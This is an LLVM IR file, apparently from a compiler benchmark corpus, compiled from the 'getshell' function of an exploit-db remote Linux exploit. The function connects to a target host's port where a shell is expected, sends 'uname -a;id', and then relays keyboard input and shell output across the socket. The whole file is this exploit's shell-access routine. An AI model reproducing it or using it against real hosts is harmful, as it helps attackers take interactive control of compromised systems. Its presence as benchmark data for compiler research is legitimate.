; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23171.c_getshell.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23171.c_getshell.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i64 }
%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [38 x i8] c"getshell(): allocating memory failed.\00", align 1
@.str.1 = private unnamed_addr constant [52 x i8] c"[*] checking to see if the exploit was successful.\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [29 x i8] c"getshell(): socket() failed.\00", align 1
@.str.3 = private unnamed_addr constant [30 x i8] c"getshell(): couldn't resolve.\00", align 1
@sport = common dso_local global i32 0, align 4
@SIGALRM = common dso_local global i32 0, align 4
@sig_alarm = common dso_local global i32 0, align 4
@TIMEOUT = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [35 x i8] c"[*] attempting to connect: %s:%d.\0A\00", align 1
@.str.5 = private unnamed_addr constant [31 x i8] c"[!] connection failed: %s:%d.\0A\00", align 1
@.str.6 = private unnamed_addr constant [37 x i8] c"[*] successfully connected: %s:%d.\0A\0A\00", align 1
@SIGINT = common dso_local global i32 0, align 4
@SIG_IGN = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [13 x i8] c"uname -a;id\0A\00", align 1
@.str.8 = private unnamed_addr constant [29 x i8] c"getshell(): select() failed.\00", align 1
@.str.9 = private unnamed_addr constant [27 x i8] c"getshell(): read() failed.\00", align 1
@.str.10 = private unnamed_addr constant [28 x i8] c"getshell(): write() failed.\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @getshell(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca %struct.hostent*, align 8
  %8 = alloca %struct.sockaddr_in, align 4
  store i8* %0, i8** %2, align 8
  %9 = call i64 @malloc(i32 4097)
  %10 = inttoptr i64 %9 to i8*
  store i8* %10, i8** %5, align 8
  %11 = icmp ne i8* %10, null
  br i1 %11, label %14, label %12

12:                                               ; preds = %1
  %13 = call i32 @printe(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str, i64 0, i64 0), i32 1)
  br label %14

14:                                               ; preds = %12, %1
  %15 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.1, i64 0, i64 0))
  %16 = load i32, i32* @AF_INET, align 4
  %17 = load i32, i32* @SOCK_STREAM, align 4
  %18 = load i32, i32* @IPPROTO_TCP, align 4
  %19 = call i32 @socket(i32 %16, i32 %17, i32 %18)
  store i32 %19, i32* %3, align 4
  %20 = icmp eq i32 %19, -1
  br i1 %20, label %21, label %23

21:                                               ; preds = %14
  %22 = call i32 @printe(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.2, i64 0, i64 0), i32 1)
  br label %23

23:                                               ; preds = %21, %14
  %24 = load i32, i32* @AF_INET, align 4
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  store i32 %24, i32* %25, align 4
  %26 = load i8*, i8** %2, align 8
  %27 = call i32 @inet_addr(i8* %26)
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  %29 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %28, i32 0, i32 0
  store i32 %27, i32* %29, align 4
  %30 = icmp ne i32 %27, 0
  br i1 %30, label %31, label %45

31:                                               ; preds = %23
  %32 = load i8*, i8** %2, align 8
  %33 = call %struct.hostent* @gethostbyname(i8* %32)
  store %struct.hostent* %33, %struct.hostent** %7, align 8
  %34 = icmp ne %struct.hostent* %33, null
  br i1 %34, label %37, label %35

35:                                               ; preds = %31
  %36 = call i32 @printe(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.3, i64 0, i64 0), i32 1)
  br label %37

37:                                               ; preds = %35, %31
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  %39 = bitcast %struct.TYPE_2__* %38 to i8*
  %40 = load %struct.hostent*, %struct.hostent** %7, align 8
  %41 = getelementptr inbounds %struct.hostent, %struct.hostent* %40, i32 0, i32 0
  %42 = load i64, i64* %41, align 8
  %43 = inttoptr i64 %42 to i8*
  %44 = call i32 @memcpy(i8* %39, i8* %43, i32 4)
  br label %45

45:                                               ; preds = %37, %23
  %46 = load i32, i32* @sport, align 4
  %47 = call i32 @htons(i32 %46)
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i32 %47, i32* %48, align 4
  %49 = load i32, i32* @SIGALRM, align 4
  %50 = load i32, i32* @sig_alarm, align 4
  %51 = call i32 @signal(i32 %49, i32 %50)
  %52 = load i32, i32* @TIMEOUT, align 4
  %53 = call i32 @alarm(i32 %52)
  %54 = load i8*, i8** %2, align 8
  %55 = load i32, i32* @sport, align 4
  %56 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.4, i64 0, i64 0), i8* %54, i32 %55)
  %57 = load i32, i32* %3, align 4
  %58 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %59 = call i64 @connect(i32 %57, %struct.sockaddr* %58, i32 12)
  %60 = icmp ne i64 %59, 0
  br i1 %60, label %61, label %65

61:                                               ; preds = %45
  %62 = load i8*, i8** %2, align 8
  %63 = load i32, i32* @sport, align 4
  %64 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.5, i64 0, i64 0), i8* %62, i32 %63)
  ret void

65:                                               ; preds = %45
  %66 = call i32 @alarm(i32 0)
  %67 = load i8*, i8** %2, align 8
  %68 = load i32, i32* @sport, align 4
  %69 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.6, i64 0, i64 0), i8* %67, i32 %68)
  %70 = load i32, i32* @SIGINT, align 4
  %71 = load i32, i32* @SIG_IGN, align 4
  %72 = call i32 @signal(i32 %70, i32 %71)
  %73 = load i32, i32* %3, align 4
  %74 = call i32 @write(i32 %73, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.7, i64 0, i64 0), i32 13)
  br label %75

75:                                               ; preds = %65, %120
  %76 = call i32 @FD_ZERO(i32* %6)
  %77 = call i32 @FD_SET(i32 0, i32* %6)
  %78 = load i32, i32* %3, align 4
  %79 = call i32 @FD_SET(i32 %78, i32* %6)
  %80 = load i32, i32* %3, align 4
  %81 = add nsw i32 %80, 1
  %82 = call i32 @select(i32 %81, i32* %6, i32 0, i32 0, i32 0)
  %83 = icmp slt i32 %82, 1
  br i1 %83, label %84, label %86

84:                                               ; preds = %75
  %85 = call i32 @printe(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.8, i64 0, i64 0), i32 1)
  br label %86

86:                                               ; preds = %84, %75
  %87 = call i64 @FD_ISSET(i32 0, i32* %6)
  %88 = icmp ne i64 %87, 0
  br i1 %88, label %89, label %105

89:                                               ; preds = %86
  %90 = load i8*, i8** %5, align 8
  %91 = call i32 @read(i32 0, i8* %90, i32 4096)
  store i32 %91, i32* %4, align 4
  %92 = icmp slt i32 %91, 1
  br i1 %92, label %93, label %95

93:                                               ; preds = %89
  %94 = call i32 @printe(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.9, i64 0, i64 0), i32 1)
  br label %95

95:                                               ; preds = %93, %89
  %96 = load i32, i32* %3, align 4
  %97 = load i8*, i8** %5, align 8
  %98 = load i32, i32* %4, align 4
  %99 = call i32 @write(i32 %96, i8* %97, i32 %98)
  %100 = load i32, i32* %4, align 4
  %101 = icmp ne i32 %99, %100
  br i1 %101, label %102, label %104

102:                                              ; preds = %95
  %103 = call i32 @printe(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.10, i64 0, i64 0), i32 1)
  br label %104

104:                                              ; preds = %102, %95
  br label %105

105:                                              ; preds = %104, %86
  %106 = load i32, i32* %3, align 4
  %107 = call i64 @FD_ISSET(i32 %106, i32* %6)
  %108 = icmp ne i64 %107, 0
  br i1 %108, label %109, label %120

109:                                              ; preds = %105
  %110 = load i32, i32* %3, align 4
  %111 = load i8*, i8** %5, align 8
  %112 = call i32 @read(i32 %110, i8* %111, i32 4096)
  store i32 %112, i32* %4, align 4
  %113 = icmp slt i32 %112, 1
  br i1 %113, label %114, label %116

114:                                              ; preds = %109
  %115 = call i32 @exit(i32 0) #3
  unreachable

116:                                              ; preds = %109
  %117 = load i8*, i8** %5, align 8
  %118 = load i32, i32* %4, align 4
  %119 = call i32 @write(i32 1, i8* %117, i32 %118)
  br label %120

120:                                              ; preds = %116, %105
  br label %75
}

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @printe(i8*, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @signal(i32, i32) #1

declare dso_local i32 @alarm(i32) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i32 @select(i32, i32*, i32, i32, i32) #1

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @read(i32, i8*, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
